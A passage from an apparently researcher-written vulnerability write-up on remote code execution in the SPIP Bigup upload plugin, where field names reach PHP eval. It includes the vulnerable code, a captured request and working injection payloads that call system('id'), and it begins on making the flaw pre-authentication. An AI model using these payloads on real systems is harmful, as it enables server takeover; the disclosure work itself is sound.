+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">extraire_fichiers_valides</span>() {
+</span></span><span style="display:flex;"><span>    $liste <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">count</span>($_FILES)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $liste;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $infos <span style="color:#f92672">=</span> []; <span style="color:#75715e">// name, pathname, error …
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">foreach</span> ($_FILES <span style="color:#66d9ef">as</span> $racine <span style="color:#f92672">=&gt;</span> $descriptions) {
+</span></span><span style="display:flex;"><span>        $infos <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_keys</span>($descriptions);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($_FILES <span style="color:#66d9ef">as</span> $racine <span style="color:#f92672">=&gt;</span> $descriptions) {
+</span></span><span style="display:flex;"><span>        $error <span style="color:#f92672">=</span> $descriptions[<span style="color:#e6db74">&#39;error&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// cas le plus simple : name=&#34;champ&#34;, on s&#39;embête pas
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_array</span>($error)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($error <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                $liste[$racine] <span style="color:#f92672">=</span> [$descriptions];
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">unset</span>($_FILES[$racine]);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// cas plus compliqués :
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// name=&#34;champ[tons][][sous][la][pluie][]&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// $_FILES[champ][error][tons][0][sous][la][pluie][0]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $chemins <span style="color:#f92672">=</span> <span style="color:#a6e22e">Files</span><span style="color:#f92672">::</span><span style="color:#a6e22e">extraire_sous_chemins_fichiers</span>($error);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">foreach</span> ($chemins[<span style="color:#e6db74">&#39;phps&#39;</span>] <span style="color:#66d9ef">as</span> $k <span style="color:#f92672">=&gt;</span> $chemin) {
+</span></span><span style="display:flex;"><span>                $var <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$_FILES[\&#39;&#39;</span> <span style="color:#f92672">.</span> $racine <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;\&#39;][\&#39;error\&#39;]&#39;</span> <span style="color:#f92672">.</span> $chemin;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">error = </span><span style="color:#e6db74">$var</span><span style="color:#e6db74">;&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ($error <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                    $description <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">foreach</span> ($infos <span style="color:#66d9ef">as</span> $info) {
+</span></span><span style="display:flex;"><span>                        $var <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$_FILES[\&#39;&#39;</span> <span style="color:#f92672">.</span> $racine <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;\&#39;][\&#39;&#39;</span> <span style="color:#f92672">.</span> $info <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;\&#39;]&#39;</span> <span style="color:#f92672">.</span> $chemin;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">x = </span><span style="color:#e6db74">$var</span><span style="color:#e6db74">; unset(</span><span style="color:#e6db74">$var</span><span style="color:#e6db74">);&#34;</span>);
+</span></span><span style="display:flex;"><span>                        $description[$info] <span style="color:#f92672">=</span> $x;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    $complet <span style="color:#f92672">=</span> $racine <span style="color:#f92672">.</span> $chemins[<span style="color:#e6db74">&#39;names&#39;</span>][$k];
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($liste[$complet])) {
+</span></span><span style="display:flex;"><span>                        $liste[$complet] <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    $liste[$complet][] <span style="color:#f92672">=</span> $description;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $liste;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><blockquote>
+<p>Do you smel it? That smelly RCE smel? 👀</p>
+</blockquote>
+<p>Indeed, a lot of eval is carried out!</p>
+<p>Here&rsquo;s the comments above the function read:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Extrait et enlève de `$_FILES` les fichiers reçus sans erreur
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * et crée un tableau avec pour clé le champ d&#39;origine du fichier
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * @return array Tableau (champ =&gt; [description])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
+</span></span></code></pre></div><p>The function seems to handle uploaded files, I didn&rsquo;t have the courage to setup XDebug so a simple <code>echo</code> in the Docker logs will suffice for debugging.</p>
+<p>It&rsquo;s apparently used to pass from a path name to an array path. Why eval then?</p>
+<p>So I added the following code at the start of the function, and displayed <code>$_FILES</code> to see what will pass through during uploads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">## Debug like a boss
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;######################################&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;Call to extraire_fichiers_valides&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_log</span>(<span style="color:#a6e22e">json_encode</span>($_FILES));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;######################################&#34;</span>);
+</span></span></code></pre></div><p>Plus we read this comment:</p>
+<pre tabindex="0"><code>// cas plus compliqués :
+// name=&#34;champ[tons][][sous][la][pluie][]&#34;
+// $_FILES[champ][error][tons][0][sous][la][pluie][0]
+</code></pre><p>To trigger the various EVALs, we need to send a file with the parameter <code>name</code> of the form <em>champ[tons][][sous][la][pluie][]</em>.
+So you can navigate from the logged-in area to <code>/ecrire</code> and upload an image. Here I&rsquo;m using the form to send a profile photo</p>
+<p>I also added:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">error_log</span>($racine);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_log</span>($chemin);
+</span></span><span style="display:flex;"><span>$var <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$_FILES[\&#39;&#39;</span> <span style="color:#f92672">.</span> $racine <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;\&#39;][\&#39;error\&#39;]&#39;</span> <span style="color:#f92672">.</span> $chemin;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_log</span>($var);
+</span></span></code></pre></div><p><img src="./img/error_log.png" alt="error_log"></p>
+<p>Uploading an image sends 3 requests, 2 of which trigger the <code>extract_valid_files</code> function!</p>
+<p>These two requests don&rsquo;t contain the uploaded image, but they do reach our vulnerable code! 😁</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /ecrire/?exec<span style="color:#f92672">=</span>auteur&amp;id_auteur<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost:8000
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Ubuntu; Linux x86_64; rv:129.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/129.0
+</span></span><span style="display:flex;"><span>Accept: application/json, text/javascript, */*; q<span style="color:#f92672">=</span>0.01
+</span></span><span style="display:flex;"><span>Accept-Language: fr,fr-FR;q<span style="color:#f92672">=</span>0.8,en-US;q<span style="color:#f92672">=</span>0.5,en;q<span style="color:#f92672">=</span>0.3
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>X-Requested-With: XMLHttpRequest
+</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary<span style="color:#f92672">=</span>---------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">1584</span>
+</span></span><span style="display:flex;"><span>Origin: http://localhost:8000
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Referer: http://localhost:8000/ecrire/?exec<span style="color:#f92672">=</span>auteur&amp;id_auteur<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Cookie: spip_session<span style="color:#f92672">=</span>1_d11b8a893cc1f545e2dee6e3e5ceb3ec; spip_admin<span style="color:#f92672">=</span>%40root%40root.root; spip_accepte_ajax<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
+</span></span><span style="display:flex;"><span>X-PwnFox-Color: blue
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;var_ajax&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>form
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;exec&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>auteur
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;id_auteur&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;formulaire_action&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>editer_logo
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;formulaire_action_args&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>o7aLD55YnoVFatZHAGqAQwWZcL0Z6FaCfDb4yh9BlxHzEDHJjuuhj1zH/aQrCvgA3lRry1gAXIHgxJclaNiXP7J3xnoB+JE/twMTVpcmUQOczifhWzHFchZPDMxK0Sia4few939TklVQhnGYmdnbni4cOszvyb3ueOHYnGsiBda5GtVbmHwU3g4eAS/CgDM4SbQj5xvy0CLNKxbCbNL75db6W+NetjxgKlHBdLlpP8eiRnzNSd11MGmPqGezNBV+1CH5T/OUZkOfy2uKfo/WdwFGduql2JNpSUWmXLQY9RjR1ZwQredgR9E<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;formulaire_action_sign&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>61e4242ff0083987cd3f876d5daa0a9ece8d7c772f4bb1f248ce3f4cb4bc9b47
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bigup_retrouver_fichiers&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;formulaire_action_verifier_json&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>true
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bigup_reinjecter_uniquement&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@28ef70ab@
+</span></span><span style="display:flex;"><span>-----------------------------35974249246826023222844215477--
+</span></span></code></pre></div><p><img src="./img/log1.png" alt="log1"></p>
+<p>You can immediately see that <code>$_FILES</code> is empty:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#a6e22e">Mon</span> <span style="color:#a6e22e">Sep</span>  <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">46</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span> <span style="color:#ae81ff">2024</span>] <span style="color:#75715e">######################################
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[<span style="color:#a6e22e">Mon</span> <span style="color:#a6e22e">Sep</span>  <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">46</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span> <span style="color:#ae81ff">2024</span>] <span style="color:#a6e22e">Call</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">extraire_fichiers_valides</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">Mon</span> <span style="color:#a6e22e">Sep</span>  <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">46</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span> <span style="color:#ae81ff">2024</span>] []
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">Mon</span> <span style="color:#a6e22e">Sep</span>  <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">46</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span> <span style="color:#ae81ff">2024</span>] <span style="color:#75715e">######################################
+</span></span></span></code></pre></div><p>So we can ask our best friend to add a file to our POST request:</p>
+<p><img src="./img/gpt.png" alt="gpt"></p>
+<p>And&hellip; IT&rsquo;S A <em>small</em> WIN! We control the file passed to the function:</p>
+<p><img src="./img/code_triggered.png" alt="code_triggered"></p>
+<p><img src="./img/meme_gpt.png" alt="meme_gpt"></p>
+<p>We can therefore adapt the <code>name</code> parameter with <code>[]</code>:</p>
+<p><img src="./img/first.png" alt="first"></p>
+<p>Here is an extract from logs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Sep  <span style="color:#ae81ff">2</span> 21:41:54 2024<span style="color:#f92672">]</span> <span style="color:#75715e">######################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Sep  <span style="color:#ae81ff">2</span> 21:41:54 2024<span style="color:#f92672">]</span> Call to extraire_fichiers_valides
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Sep  <span style="color:#ae81ff">2</span> 21:41:54 2024<span style="color:#f92672">]</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;HELLO&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;WORLD&#34;</span>:<span style="color:#e6db74">&#34;example.txt&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;full_path&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;WORLD&#34;</span>:<span style="color:#e6db74">&#34;example.txt&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;type&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;WORLD&#34;</span>:<span style="color:#e6db74">&#34;text\/plain&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;tmp_name&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;WORLD&#34;</span>:<span style="color:#e6db74">&#34;\/tmp\/phpB6Hmiq&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;error&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;WORLD&#34;</span>:0<span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;size&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;WORLD&#34;</span>:38<span style="color:#f92672">}}}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Sep  <span style="color:#ae81ff">2</span> 21:41:54 2024<span style="color:#f92672">]</span> <span style="color:#75715e">######################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Sep  <span style="color:#ae81ff">2</span> 21:41:54 2024<span style="color:#f92672">]</span> HELLO
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Sep  <span style="color:#ae81ff">2</span> 21:41:54 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;WORLD&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Sep  <span style="color:#ae81ff">2</span> 21:41:54 2024<span style="color:#f92672">]</span> $_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;HELLO&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;error&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;WORLD&#39;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>The last 3 lines correspond to <code>$racine</code> <code>$chemin</code> and <code>$var</code>.</p>
+<p><code>$var</code> corresponds to the string that will be evaluated next, passing <em>&ldquo;HELLO[WORLD]&rdquo;</em>, here&rsquo;s the string formed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$_FILES[<span style="color:#e6db74">&#39;HELLO&#39;</span>][<span style="color:#e6db74">&#39;error&#39;</span>][<span style="color:#e6db74">&#39;WORLD&#39;</span>]
+</span></span></code></pre></div><p>The complete code evaluated will therefore be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$error <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;HELLO&#39;</span>][<span style="color:#e6db74">&#39;error&#39;</span>][<span style="color:#e6db74">&#39;WORLD&#39;</span>];
+</span></span></code></pre></div><h2 id="remote-code-execution">Remote Code Execution</h2>
+<blockquote>
+<p>What happens if I send a single quote? 🤔</p>
+</blockquote>
+<p>Response: <strong>The server returns a 500 error!</strong></p>
+<p><img src="./img/500.png" alt="500"></p>
+<p>From the docker logs, we can read:</p>
+<p><img src="./img/500_log.png" alt="500_log"></p>
+<p>Here we see that the <code>'</code> is not filtered, so the context is broken and the call to <em>eval</em> returns an error.</p>
+<p>Finally, we can add a real payload to control the contents of the string between the square brackets.</p>
+<p>The payload payload <code>HELLO[AB'.strval(5+5).'CD]</code> lead to this log line:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Undefined array key <span style="color:#e6db74">&#34;AB10CD&#34;</span> in ... plugins-dist/bigup/inc/Bigup/Files.php<span style="color:#f92672">(</span>276<span style="color:#f92672">)</span> : eval<span style="color:#f92672">()</span><span style="color:#960050;background-color:#1e0010">&#39;</span>d code on line <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>The rce is now trivial, with the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HELLO[AB&#39;.system(&#39;id&#39;).die().&#39;CD]&#34;</span>
+</span></span></code></pre></div><p><img src="./img/rce.png" alt="rce"></p>
+<p><img src="./img/win2.png" alt="win2"></p>
+<p>My first reaction was like</p>
+<p><img src="./img/lalu.png" alt="lalu"></p>
+<p>But in the end he confirmed that he didn&rsquo;t have it in his notes!</p>
+<p>If you&rsquo;re curious, this was related to my <a href="https://x.com/Vozec1/status/1822647021733281895" target="_blank">teasing tweet</a> from a few weeks ago, hashing the proof that I had this exploit at this time, without leaking sensitive information (kindly suggested to do so by Laluka to keep track &amp; proofs).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#f92672">~/</span><span style="color:#a6e22e">Desktop</span>]<span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#66d9ef">echo</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">ne</span> <span style="color:#e6db74">&#34;name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">RCE[&#39;.system(&#39;id&#39;).die().&#39;]</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;&#34;</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">md5sum</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">fd0828be2a9d90e89e226f1fcd6d5d9</span>  <span style="color:#f92672">-</span>
+</span></span></code></pre></div><h2 id="additional-note">Additional note:</h2>
+<p>The vulnerability can also be triggered in the first part of the name parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;RCE&#39;-system(&#39;id&#39;)-&#39;[ABCD]&#34;</span>
+</span></span></code></pre></div><p>The dot is filtered, but you can use <code>sprintf</code> to call the <code>die</code> function after the <code>system</code> to avoid an error in logs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;RCE&#39;-sprintf(system(&#39;id&#39;),die())-&#39;[ABCD]&#34;</span>
+</span></span></code></pre></div><p><img src="./img/isok.png" alt="isok"></p>
+<p>Hello, Laluka here, I&rsquo;ll take the next part that makes this lovely post-auth RCE pre-auth! 😉</p>
+<h2 id="making-the-rce-pre-auth">Making the RCE Pre-Auth</h2>
+<p>Once Vozec showed me that his issue was related to file upload, and required a form to submit, I had two thoughts:</p>
+<ul>
+<li>First, we might get lucky, maybe the code path is reached with any form?</li>
+<li>Second, if we&rsquo;re unlucky, we&rsquo;ll have to find another path!</li>
+</ul>
+<p>So, here&rsquo;s the flow:</p>
+<ul>
+<li><code>extraire_fichiers_valides()</code> from <code>plugins-dist/bigup/inc/Bigup/Files.php</code>, called by
+<ul>
+<li><code>gerer_fichiers_postes()</code> within <code>plugins-dist/bigup/inc/Bigup.php</code>, called by
+<ul>
+<li><code>bigup_formulaire_receptionner($flux)</code> within <code>plugins-dist/bigup/bigup_pipelines.php</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>I stopped there, as the pipelining system behaves in a &ldquo;global&rdquo; way, -close to- every pass through it, so let&rsquo;s &ldquo;assume&rdquo; we&rsquo;re lucky, and hit right away!</p>
+<p>The code only passes through the right code path if a specific parameter is present, so let&rsquo;s add it! (i.e. <code>bigup_retrouver_fichiers=foo</code>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/**
+</span></span><span style="display:flex;"><span> * Branchement sur la réception d<span style="color:#e6db74">&#39;un formulaire (avant verifier())
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * On remet `$_FILES` avec les fichiers présents pour ce formulaire,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * et avant que la fonction verifier native du formulaire soit utilisée,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * de sorte qu&#39;</span>elle ait accès à $_FILES rempli.
+</span></span><span style="display:flex;"><span> *
+</span></span><span style="display:flex;"><span> * @pipeline formulaire_receptionner
+</span></span><span style="display:flex;"><span> * @param array $flux
+</span></span><span style="display:flex;"><span> * @return array
+</span></span><span style="display:flex;"><span> */
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> bigup_formulaire_receptionner<span style="color:#f92672">(</span>$flux<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_request<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;bigup_retrouver_fichiers&#39;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>		$bigup <span style="color:#f92672">=</span> bigup_get_bigup<span style="color:#f92672">(</span>$flux<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>		$bigup-&gt;gerer_fichiers_postes<span style="color:#f92672">()</span>; // les fichiers postés sans JS
+</span></span><span style="display:flex;"><span>		$liste <span style="color:#f92672">=</span> $bigup-&gt;reinserer_fichiers<span style="color:#f92672">(</span>_request<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;bigup_reinjecter_uniquement&#39;</span><span style="color:#f92672">))</span>;
+</span></span><span style="display:flex;"><span>		$bigup-&gt;surveiller_fichiers<span style="color:#f92672">(</span>$liste<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> $flux;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><blockquote>
